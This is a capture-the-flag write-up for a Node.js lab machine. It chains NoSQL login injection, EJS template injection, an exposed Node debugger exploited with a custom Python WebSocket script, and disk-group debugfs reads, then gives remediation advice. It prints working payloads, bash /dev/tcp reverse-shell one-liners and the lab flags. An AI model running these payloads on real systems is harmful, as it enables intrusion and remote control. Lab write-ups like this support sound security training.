# The Byte Lotus Hotel — Do Not Disturb

**Category:** Web / Boot2Root **Difficulty:** Medium **Points:** 90 **Target:** `10.48.186.79` (also seen as `10.49.183.138` during the session) **Author:** Obito Uchiha — Team AKATSUKI

---

## Summary

Byte Lotus is a multi-stage boot2root chain built around a Node.js/Express "poolside reservation portal." The path to root moves through four distinct vulnerability classes without repeating a technique:

1. **NoSQL Injection** on the login endpoint → staff session
2. **Server-Side Template Injection (SSTI)** in an EJS preview feature → RCE as `poolside`
3. **Exposed Node.js Inspector debugger** on localhost → lateral movement / RCE as `pipelinesvc`
4. **`disk` group membership abuse** via `debugfs` → raw filesystem read → root flag

|Flag|Value|
|---|---|
|User|`THM{w4rm_s3ss10n_h1j4ck3d}`|
|Root|`THM{r4w_d1sk_4cc3ss_w4s_t00_much}`|

---

## 1. Reconnaissance

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
```

Only SSH and HTTP exposed. `whatweb` confirmed `X-Powered-By: Express` and a login page titled _"Byte Lotus — Poolside."_

### Directory brute-force

```bash
ffuf -u http://10.48.186.79/FUZZ -w /usr/share/dirb/wordlists/common.txt
```

```
logout   [Status: 302]
staff    [Status: 403]
```

`/staff` returning 403 (rather than 404) confirmed the route exists but requires authentication/authorization — a clear target for the next stage.

### Page source review

The homepage HTML revealed the login form posts to `/login`:

```html
<form method="post" action="/login">
  <input name="username" ...>
  <input name="password" type="password" ...>
</form>
```

`GET /login` returned 404, confirming the route only accepts `POST`.

---

## 2. Initial Access — NoSQL Injection

A baseline `POST /login` with junk credentials returned `401 Unauthorized` with **no cookie set** — ruling out session fixation and confirming the cookie is only issued on a successful authentication.

Classic SQL-style bypass payloads (`' OR '1'='1`) failed, since the backend is not a SQL database. Given the Express + likely-Mongo-style backend, a NoSQL operator injection was tried instead — sending the payload as JSON rather than form-encoded, using the `$ne` (not-equal) operator to bypass the password check entirely:

```bash
curl -i \
  -H "Content-Type: application/json" \
  -X POST http://10.49.183.138/login \
  -d '{"username":"attendant","password":{"$ne":null}}'
```

**Response:**

```
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3Ad1NeSsxQ8-iCZjDKBLhskZiMirM03CBV.JMVDyl5UjLINTVhuq23JO05OGi06Ug%2BJzgl2QXO6540; Path=/; HttpOnly
{"ok":true,"role":"staff"}
```

By passing `{"$ne": null}` as the password, the underlying query effectively became _"find a user named `attendant` whose password is not null"_ — which is true for any valid user, bypassing the credential check entirely and authenticating as `attendant` with the `staff` role.

**Root cause (confirmed later via source):**

```js
const username = req.body.username;
const password = req.body.password;
user = await db.findOneAsync({ username, password });
```

User-supplied JSON is passed directly into the NeDB query object with no type validation or sanitization, allowing MongoDB-style query operators to be injected as the `password` field.

---

## 3. Privilege Escalation to `poolside` — SSTI in EJS

Using the `connect.sid` cookie obtained above, `/staff` returned a "Cabana Desk" console — a form allowing staff to preview an EJS-templated guest confirmation message:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

### Confirming SSTI

```bash
curl -s -b "connect.sid=..." http://10.49.183.138/staff/preview \
  --data-urlencode 'template=Dear <%= 7*7 %>, confirmed.'
```

**Response:** `Dear 49, confirmed.` — the arithmetic expression was evaluated server-side, confirming the raw `template` field is passed directly into `ejs.render()`.

**Confirmed in source:**

```js
app.post('/staff/preview', requireStaff, (req, res) => {
  const template = req.body.template || '';
  rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
  ...
});
```

The entire user-controlled template string is rendered by EJS with no sandboxing, which is equivalent to allowing arbitrary JavaScript execution server-side.

### From SSTI to RCE

```bash
curl -s -b "connect.sid=..." http://10.49.183.138/staff/preview \
  --data-urlencode 'template=<%= (function(){ return process.mainModule.require("child_process").execSync("id").toString(); })() %>'
```

**Response:** `uid=996(poolside) gid=996(poolside) groups=996(poolside)`

Command execution confirmed as the `poolside` service user.

### Reverse shell

```bash
curl -s -b "connect.sid=..." http://10.49.183.138/staff/preview \
  --data-urlencode 'template=<%= (function(){ return process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\"").toString(); })() %>'
```

Listener:

```bash
nc -lvnp 4444
```

Landed a shell as `poolside`, stabilized with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User flag

```bash
find / -iname "*user.txt*" 2>/dev/null
cat /home/poolside/user.txt
```

**`THM{w4rm_s3ss10n_h1j4ck3d}`**

---

## 4. Lateral Movement — Exposed Node.js Inspector

Enumerating running processes:

```bash
ps auxww
```

Two processes stood out:

```
pipelin+   597  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
root       677  /usr/bin/python3 /usr/share/unattended-upgrades/...
```

PID 597 was running under a **different, unprivileged service account** with the V8 **Inspector protocol enabled** (`--inspect`), bound to localhost only — meaning it was unreachable externally, but directly reachable from our current shell.

```bash
grep -E "^p" /etc/passwd
```

```
pipelinesvc:x:995:995::/home/pipelinesvc:/usr/sbin/nologin
```

The process runs as `pipelinesvc` (uid 995), executing `/opt/pipelinesvc/telemetry/processor.js`.

### Confirming the inspector is reachable

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "title": "processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/7e4ac8d7-7206-4d82-87a2-26939ac9d63e"
}]
```

The Node inspector exposes a WebSocket-based debugger protocol. Anyone who can reach this endpoint can send `Runtime.evaluate` commands and execute arbitrary JavaScript **in the context of the target process** — i.e., as `pipelinesvc`.

### Exploiting the inspector (no `ws` npm module available)

Since the target had no internet access to install the `ws` npm package, a raw WebSocket client was hand-rolled in Python (stdlib `socket` only) to:

1. Perform the WebSocket upgrade handshake against the debugger URL
2. Frame and send a JSON-RPC `Runtime.evaluate` message
3. Read back the result

```python
import socket, base64, os, struct, json, re, time
import urllib.request

HOST, PORT = "127.0.0.1", 9229

info = json.loads(urllib.request.urlopen(f"http://{HOST}:{PORT}/json").read())
ws_url = info[0]["webSocketDebuggerUrl"]
path = re.sub(r"ws://[^/]+", "", ws_url)

key = base64.b64encode(os.urandom(16)).decode()
req = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
)

s = socket.create_connection((HOST, PORT))
s.sendall(req.encode())
print(s.recv(4096).decode(errors="ignore"))

def send_frame(sock, data):
    payload = data.encode()
    header = bytearray([0x81])
    length = len(payload)
    if length < 126:
        header.append(0x80 | length)
    elif length < 65536:
        header.append(0x80 | 126); header += struct.pack(">H", length)
    else:
        header.append(0x80 | 127); header += struct.pack(">Q", length)
    mask = os.urandom(4)
    header += mask
    masked = bytearray(payload)
    for i in range(len(masked)):
        masked[i] ^= mask[i % 4]
    sock.sendall(bytes(header) + bytes(masked))

cmd = "require('child_process').execSync('id').toString()"
msg = json.dumps({"id": 1, "method": "Runtime.evaluate",
                   "params": {"expression": cmd, "includeCommandLineAPI": True}})
send_frame(s, msg)
time.sleep(1)
print(s.recv(65536).decode(errors="ignore"))
```

**Result:**

```
{"id":1,"result":{"result":{"type":"string",
 "value":"uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n"}}}
```

RCE confirmed as `pipelinesvc` — and critically, this user belongs to the **`disk`** group.

### Reverse shell as `pipelinesvc`

The `cmd` expression was swapped for a reverse shell one-liner and re-sent over the same WebSocket exploit:

```python
cmd = "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4445 0>&1\"')"
```

```bash
nc -lvnp 4445
python3 inspect_rce.py
```

```
pipelinesvc@tryhackme-2404:/opt/pipelinesvc/telemetry$ id
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

---

## 5. Privilege Escalation to Root — `disk` Group / Raw Block Device Access

Membership in the `disk` group grants read access to raw block devices, which bypasses standard filesystem permissions entirely — any file on the partition can be read directly from the device image.

```bash
lsblk
```

```
nvme0n1     20G  disk
└─nvme0n1p1 20G  part /
```

`debugfs` (part of `e2fsprogs`, used for offline ext-filesystem inspection) was available and could read the root partition directly without mounting it:

```bash
which debugfs
# /usr/sbin/debugfs

debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

**Result:**

```
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

## 6. Attack Chain Summary

|Stage|Technique|Access Gained|
|---|---|---|
|1|NoSQL operator injection (`$ne`) on `/login`|Staff session (`attendant` role)|
|2|SSTI via unsanitized `ejs.render(userInput)` on `/staff/preview`|RCE as `poolside` → user flag|
|3|Exposed Node `--inspect` debugger on `127.0.0.1:9229`, exploited via raw WebSocket `Runtime.evaluate`|RCE as `pipelinesvc`|
|4|`pipelinesvc` in `disk` group → `debugfs` raw device read|Root filesystem read → root flag|

---

## 7. Root Cause & Remediation

|Issue|Root Cause|Fix|
|---|---|---|
|NoSQL Injection|Raw `req.body` passed directly into `db.findOneAsync()` without type/schema validation|Enforce strict types on `username`/`password` (reject non-string input); use parameterized query builders or explicit field whitelisting|
|SSTI|User-controlled string passed directly to `ejs.render()`|Never render untrusted input as a template. If dynamic content is required, use `ejs.render(fixedTemplate, { userData })` — pass user input only as _data_, never as the _template string_|
|Exposed debugger|`--inspect` bound and left running in what appears to be a production-like environment|Never run `--inspect` outside local dev; if required, bind only to a Unix socket and use OS-level access control, and ensure the service account has no unnecessary group memberships|
|`disk` group privesc|`pipelinesvc` service account granted membership in the `disk` group unnecessarily|Apply least privilege — service accounts should never be in `disk`, `root`, or other high-privilege groups unless absolutely required, and if required, prefer targeted `setfacl` permissions over raw device access|

---

_Writeup by Obito Uchiha — Team AKATSUKI_